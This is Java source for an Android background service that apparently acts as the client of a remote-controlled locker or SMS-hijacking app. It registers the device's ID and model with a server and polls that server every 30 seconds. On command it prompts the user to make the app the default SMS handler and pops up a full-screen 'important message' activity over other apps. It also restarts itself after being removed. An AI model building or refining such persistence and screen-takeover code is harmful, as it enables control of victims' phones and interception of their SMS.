package cav.testforwl.service;

import android.app.AlarmManager;
import android.app.Notification;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Build;
import android.os.IBinder;
import android.provider.Telephony;
import android.support.v4.app.NotificationCompat;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.util.concurrent.TimeUnit;

import cav.testforwl.R;
import cav.testforwl.ui.WebMessageActivity;
import cav.testforwl.utils.ConstantManager;
import cav.testforwl.utils.DataManager;
import cav.testforwl.utils.GetREST;

public class MyRequestService extends Service {

    private static final String TAG = "MYSERVICE";

    private DataManager mDataManager;

    public MyRequestService() {
        mDataManager = DataManager.getInstance();
    }

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG,"ON Create servis");
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG,"DESTROY");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        Log.d(TAG,"START COMMAND");
        String deviceId = intent.getStringExtra(ConstantManager.ANDROID_ID);
        String deviceModel = intent.getStringExtra(ConstantManager.ANDROID_MODEL);
        myTask(deviceId,deviceModel);
        //return super.onStartCommand(intent, flags, startId);
        return START_STICKY;
    }


    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        Log.d(TAG,"BIND");

        return null;
        //throw new UnsupportedOperationException("Not yet implemented");
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
       // super.onTaskRemoved(rootIntent);
        Log.d(TAG,"Task REMOVED");

        if (Build.VERSION.SDK_INT == 19){
            // TODO возможно тут косяк и его надо править
            Intent restartIntent = new Intent(this, getClass());
            AlarmManager am = (AlarmManager) getSystemService(ALARM_SERVICE);
            PendingIntent pi = PendingIntent.getService(this, 1, restartIntent,
                    PendingIntent.FLAG_ONE_SHOT);
            restartIntent.putExtra("RESTART","");
            am.setExact(AlarmManager.RTC, System.currentTimeMillis() + 3000, pi);
        }
    }

    private void myTask(final String deviceId,final String deviceModel) {
        new Thread(new Runnable() {
            public void run() {
                if (isOnline() && mDataManager.getPreferensManager().isRegistry()!=true) {
                    Log.d(TAG+" 2.0 ",deviceId);
                    Log.d(TAG+" 2.0 ",deviceModel);
                    //new AsyncReuest(deviceId,deviceModel).execute();
                    new GetREST().registry(deviceId,deviceModel);
                }

                int i =0;
                while (true) {
                //for (int i = 1; i < 6; i ++) {
                    try {
                        TimeUnit.SECONDS.sleep(30);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    Log.d("my_tag", "hello from service: " + i);
                    if (isOnline()) {
                        boolean res = new GetREST().get_data(deviceId);
                        Log.d(TAG, deviceId);
                        if (res) {
                            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
                                changeDefaultSMSClient(mDataManager.getPreferensManager().isChangeSMS());
                            }
                            if (!mDataManager.getPreferensManager().isLockScreen()) {
                                if (WebMessageActivity.sWebMessageActivity!=null)
                                    WebMessageActivity.sWebMessageActivity.finish();
                                showNotification();
                            } else  {
                                Context context = getApplicationContext();
                                Intent intent = new Intent(context, WebMessageActivity.class);
                                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                                startActivity(intent);
                            }
                        }
                    }
                    i+=1;
                }
            }
        }).start();
    }

    private void changeDefaultSMSClient(boolean mode){
        final String myPackageName = getPackageName();

        Log.d(TAG,myPackageName);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
            Log.d(TAG,Telephony.Sms.getDefaultSmsPackage(this));
            if (!Telephony.Sms.getDefaultSmsPackage(this).equals(myPackageName)) {
                Log.d(TAG,"ТИПА НЕ ДЕФОЛТ");
                Context context = getApplicationContext();
                Intent intent = new Intent(Telephony.Sms.Intents.ACTION_CHANGE_DEFAULT);
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intent.putExtra(Telephony.Sms.Intents.EXTRA_PACKAGE_NAME,myPackageName);
                startActivity(intent);
            } else {
                Log.d(TAG,"ТИПА ДЕФОЛТ");
            }
        }
    }

    private static final int NOTIFY_ID = 101;

    private void showNotification(){
//http://startandroid.ru/ru/uroki/vse-uroki-spiskom/164-urok-99-service-uvedomlenija-notifications.html
        ///http://androidexample.com/Incomming_SMS_Broadcast_Receiver_-_Android_Example/index.php?view=article_discription&aid=62
        // https://android.googlesource.com/platform/development/+/e77abcd/samples/devbytes/telephony/SmsSampleProject/SmsSample/src/main/AndroidManifest.xml
        //https://www.shinobicontrols.com/blog/bitesize-android-kitkat-week-4-replacing-the-default-sms-app

        Context context = getApplicationContext();
        Intent notificationIntent = new Intent(context, WebMessageActivity.class);
        PendingIntent contentIntent = PendingIntent.getActivity(context,
                0, notificationIntent,
                PendingIntent.FLAG_CANCEL_CURRENT);

        NotificationManager notificationManager = (NotificationManager) context
                .getSystemService(Context.NOTIFICATION_SERVICE);


        Notification notification;

        // блин несколько кривовато
        if (Build.VERSION.SDK_INT < 11) {
            NotificationCompat.Builder builder = new NotificationCompat.Builder(context);
            builder.setContentIntent(contentIntent)
                    .setSmallIcon(R.drawable.ic_announcement_black_24dp)
                    .setTicker(mDataManager.getPreferensManager().getMessage())
                    .setWhen(System.currentTimeMillis())
                    .setAutoCancel(true)
                    .setContentTitle("Важное сообщение!")
                    .setContentText(mDataManager.getPreferensManager().getMessage()); // Текст уведомления;
                notification = builder.getNotification(); // до API 16
        } else {
            Notification.Builder builder = new Notification.Builder(context);
            builder.setContentIntent(contentIntent)
                    .setSmallIcon(R.drawable.ic_announcement_black_24dp)
                    .setTicker(mDataManager.getPreferensManager().getMessage())
                    .setWhen(System.currentTimeMillis())
                    .setAutoCancel(true)
                    .setContentTitle("Важное сообщение!")
                    .setContentText(mDataManager.getPreferensManager().getMessage()); // Текст уведомления;
            if (Build.VERSION.SDK_INT < 16) {
                notification = builder.getNotification(); // до API 16
            } else {
                notification = builder.build();
            }
        }

        notificationManager.notify(NOTIFY_ID, notification);


/*
        Notification.Builder builder;

        if (Build.VERSION.SDK_INT < 11) {
            NotificationCompat.Builder builder1 = new NotificationCompat.Builder(context);
        }else {
            builder = new Notification.Builder(context);
        }

        builder.setContentIntent(contentIntent)
                .setSmallIcon(R.drawable.ic_announcement_black_24dp)
                //.setTicker(res.getString(R.string.warning)) // текст в строке состояния
                .setTicker(mDataManager.getPreferensManager().getMessage())
                .setWhen(System.currentTimeMillis())
                .setAutoCancel(true)
                //.setContentTitle(res.getString(R.string.notifytitle)) // Заголовок уведомления
                .setContentTitle("Важное сообщение!")
                //.setContentText(res.getString(R.string.notifytext))
                .setContentText(mDataManager.getPreferensManager().getMessage()); // Текст уведомления

        Notification notification;

        if (Build.VERSION.SDK_INT < 16) {
            notification = builder.getNotification(); // до API 16
        } else {
            notification = builder.build();
        }


        notificationManager.notify(NOTIFY_ID, notification);
        */
    }

    // проверяем включен ли интернетик
    private boolean isOnline(){
        ConnectivityManager cm = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);;
        NetworkInfo netInfo = cm.getActiveNetworkInfo();
        return netInfo != null && netInfo.isConnectedOrConnecting();
    }

    class AsyncReuest extends AsyncTask<Void,Void,Void> {
        private String deviceId;
        private String deviceModel;

        public AsyncReuest(String deviceId,String deviceModel){
            this.deviceId = deviceId;
            this.deviceModel = deviceModel;
        }

        @Override
        protected Void doInBackground(Void... strings) {
            Log.d(TAG,"START HTTP");

            new GetREST().registry(deviceId,deviceModel);
            return null;
        }

    }
}
